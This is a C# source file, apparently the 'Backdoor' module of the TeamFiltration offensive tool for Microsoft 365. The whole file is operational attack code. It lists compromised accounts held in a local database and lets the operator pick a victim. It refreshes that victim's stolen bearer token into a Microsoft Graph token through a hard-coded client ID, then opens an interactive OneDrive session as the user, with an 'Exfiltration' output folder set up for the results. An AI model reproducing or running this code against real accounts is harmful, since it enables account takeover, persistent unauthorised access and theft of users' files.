using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IdentityModel.Tokens.Jwt;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using TeamFiltration.Handlers;
using TeamFiltration.Helpers;
using TeamFiltration.Models.MSOL;

namespace TeamFiltration.Modules
{

    public class Backdoor
    {
        public static DatabaseHandler _dataBaseHandler { get; set; }

        public static async Task BackdoorAsync(string[] args)
        {
            _dataBaseHandler = new DatabaseHandler(args);

            var _globalProperties = new GlobalArgumentsHandler(args, _dataBaseHandler);

            var rootExfilFolder = Path.Combine(_globalProperties.OutPutPath, "Exfiltration");

            var msolHandler = new MSOLHandler(_globalProperties, "BACKDOOR", _dataBaseHandler);


            //Query a list of valid logins for users
            var validLogins = _dataBaseHandler.QueryValidLogins();

            //If we have any valid logins
            if (validLogins.Count() > 0)
            {

                int options = 0;
          
                foreach (var loginObject in validLogins)
                {
                    Console.WriteLine($"    |-> {options++} - {loginObject.Username}");

                }
                Console.WriteLine();
                Console.Write("[?] What user to target? #> ");
                var selection = Console.ReadLine();

                var intSelection = Convert.ToInt32(selection);

                var targetLoginObject = validLogins[intSelection];

                //Pull tokens avaiable
                var latestPulledToken = _dataBaseHandler.TokensAvailable(targetLoginObject);
                var latestPulledTokenObjet = JsonConvert.DeserializeObject<BearerTokenResp>(latestPulledToken.FirstOrDefault().ResponseData);

                var msGraphToken = await msolHandler.RefreshAttempt(latestPulledTokenObjet, _globalProperties.GetBaseUrl(), "https://graph.microsoft.com", "1fec8e78-bce4-4aaf-ab1b-5451cc387264");

                var oneDriveGrapHandler = new OneDriveHandler(msGraphToken.bearerToken, targetLoginObject.Username, _globalProperties, _dataBaseHandler);

                await oneDriveGrapHandler.StartInteractive();

            }
        }

    }
}

